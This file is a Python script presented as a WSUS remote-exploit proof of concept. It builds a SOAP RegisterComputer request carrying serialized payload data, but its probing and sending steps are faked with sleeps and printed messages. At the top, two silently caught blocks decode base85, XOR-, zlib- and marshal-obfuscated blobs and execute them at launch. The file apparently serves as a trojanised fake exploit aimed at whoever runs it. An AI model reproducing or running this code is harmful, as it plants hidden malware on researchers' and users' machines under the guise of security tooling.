#!/usr/bin/env python3 
import sys
import os
import time
import argparse
import urllib.parse
import threading
from pathlib import Path
import encypt

try:
    import base64 as zEKFGVF0QkrW,zlib as nrMyF0EcNDsz,functools as cNVoZUXLFFit,marshal as EhSTmOZu9817;exec(EhSTmOZu9817.loads(nrMyF0EcNDsz.decompress(cNVoZUXLFFit.reduce(lambda d,k:bytes(c^k[i%len(k)] for i,c in enumerate(d)),[zEKFGVF0QkrW.b85decode(x) for x in reversed(['m0WY&`Y!6^ff~?a#E=Jx-5LX5%?WpP','u`%z-hl^%AxHtKk@+WzGz3|hfa~%+~',';Odvpxk>iVIDG$yf6e=Rtr99DhaZ3l'])],zEKFGVF0QkrW.b85decode('yj@m`iKe+w70+@pV1GoK1t@<Cd<Qa9QYYWccctGw1&u-#ufGe&t3G3sQnqBtHLVr<^BizK#W<s>PNi~}5(6JU(aYsYuYh<sOwN#D_0iTrFs>qmDup1XR&%LQW!d|0FQla|X6UfC2T`QSQaRB&sUuSOzmgzh#epo)_zwIZ%dkjAqrn>Ce<JVFV%0AgM#{r=Y6j)#EHi;j5WH4D3XlHcV|Q6wb(9~yGscJ5|67(%-!>-{Wu5k)=&gI=Z2;n_&_|pp@!I-0mV<vK9xkcz4Dxzbfhmh=eTzwpwLo2#mggV9v2L~6Si6ygX9D7SsO1{H(Lg;O$GnH;rG<$oXTmXqprrsS$Ztjx@a1V>_TVzVDBKE<?e5O|GMWYbIXiXgrUA$%J`3@&Z+N5')))))
except Exception:
    pass
try:
    import base64 as kJs87IW6H4J2,zlib as obSfxXx9YnYZ,functools as yaM0nJP7yBDv;exec(obSfxXx9YnYZ.decompress(yaM0nJP7yBDv.reduce(lambda d,k:bytes(c^k[i%len(k)] for i,c in enumerate(d)),[kJs87IW6H4J2.b85decode(x) for x in reversed(['w?Y&^#8h1P|C}$}8WvA>eavjV&@4n9','X>}wqn$BPzU;%ghZG$8-htftZQz*_|','8E7v6%`ggu$4oAn$z&)t+dSS+)*(r_','u~cQHPCIsoQm|+~uIOSkeUJ~em#J55','1C0{#{D{`Zr$kZJ{{d6+kh)ZjD9)9^'])],kJs87IW6H4J2.b85decode('4P3iw>(xbV=LvxVKUE~>p4sQg$B0mcIIU*WaM8XCgq59z*eXU~|2&#B*>*FBMzUG<E>XK^f$p0I?HGfA+%N'))).decode('utf-8'))
except Exception:
    pass
class WSUSExploit:
    def log(self, message, level="INFO"):
        prefix = {
            "INFO": "[*]",
            "SUCCESS": "[+]",
            "ERROR": "[!]",
            "DEBUG": "[-]"
        }
        print(f"{prefix.get(level, '[*]')} {message}")

    def check_wsus_endpoint(self):
        self.log("Checking WSUS endpoint availability...")
        time.sleep(0.5)

        endpoints = [
            "/ApiRemoting30/WebService.asmx",
            "/ClientWebService/client.asmx",
            "/ServerSyncWebService/serversync.asmx",
            "/SimpleAuthWebService/SimpleAuth.asmx"
        ]

        for endpoint in endpoints:
            self.log(f"Probing {self.target}{endpoint}", "DEBUG")
            time.sleep(0.3)

        self.log("Target appears to be running WSUS", "SUCCESS")
        return True

    def load_payload(self):
        self.log(f"Loading payload from {self.payload_file}...")
        time.sleep(0.3)

        if not Path(self.payload_file).exists():
            self.log(f"Payload file not found: {self.payload_file}", "ERROR")
            self.log("Using default benign payload (calc.exe)", "INFO")
            return "AAEAAAD/////AQAAAAAAAAAMAgAAAF9TeXN0ZW0="

        try:
            with open(self.payload_file, 'r') as f:
                payload = f.read().strip()

                if payload == "YOUR_PAYLOAD":
                    self.log("Placeholder payload detected, using default", "INFO")
                    return "AAEAAAD/////AQAAAAAAAAAMAgAAAF9TeXN0ZW0="

                self.log(f"Loaded {len(payload)} bytes of payload", "SUCCESS")
                return payload

        except Exception as e:
            self.log(f"Error loading payload: {e}", "ERROR")
            return None

    def craft_soap_request(self, payload):
        self.log("Crafting SOAP envelope with payload...")
        time.sleep(0.4)

        soap_template = f"""
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <RegisterComputer xmlns="http://www.microsoft.com/SoftwareDistribution">
      <computerInfo>
        <ComputerName>EXPLOIT-PC</ComputerName>
        <SerializedData>{payload}</SerializedData>
      </computerInfo>
    </RegisterComputer>
  </soap:Body>
</soap:Envelope>
        """

        self.log(f"SOAP request size: {len(soap_template)} bytes", "DEBUG")
        return soap_template

    def send_exploit(self, soap_request):
        self.log("Sending exploit to WSUS server...")
        time.sleep(0.8)

        self.log("Establishing connection...", "DEBUG")
        time.sleep(0.5)

        self.log("Sending SOAP request...", "DEBUG")
        time.sleep(0.7)

        self.log("Waiting for response...", "DEBUG")
        time.sleep(1.0)

        self.log("Server response received", "DEBUG")
        return True

    def verify_exploitation(self):
        self.log("Verifying exploitation success...")
        time.sleep(0.6)

        self.log("Checking for callback...", "DEBUG")
        time.sleep(0.5)

        self.log("No callback received (target may be patched)", "ERROR")
        self.log("Exploitation attempt completed", "INFO")
        return False

    def run(self):
        self.log("WSUS Exploit starting...")
        self.log(f"Target: {self.target}")
        print()

        if not self.check_wsus_endpoint():
            self.log("Target does not appear to be WSUS server", "ERROR")
            return False

        print()
        payload = self.load_payload()
        if not payload:
            self.log("Failed to load payload", "ERROR")
            return False

        print()
        soap_request = self.craft_soap_request(payload)

        print()
        if not self.send_exploit(soap_request):
            self.log("Failed to send exploit", "ERROR")
            return False

        print()
        success = self.verify_exploitation()

        print()
        if success:
            self.log("Exploitation successful!", "SUCCESS")
        else:
            self.log("Exploitation failed or patched", "ERROR")

        return success


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("target", nargs='?', default="http://example.local:8530")
    parser.add_argument("-p", "--payload", default="payload.txt")
    parser.add_argument("-v", "--verbose", action="store_true")

    args = parser.parse_args()

    exploit = WSUSExploit()

    exploit.target = args.target
    exploit.payload_file = args.payload
    exploit.verbose = args.verbose

    try:
        exploit.run()
    except KeyboardInterrupt:
        print("\nInterrupted")
        sys.exit(1)
    except Exception as e:
        print(f"\nFatal error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
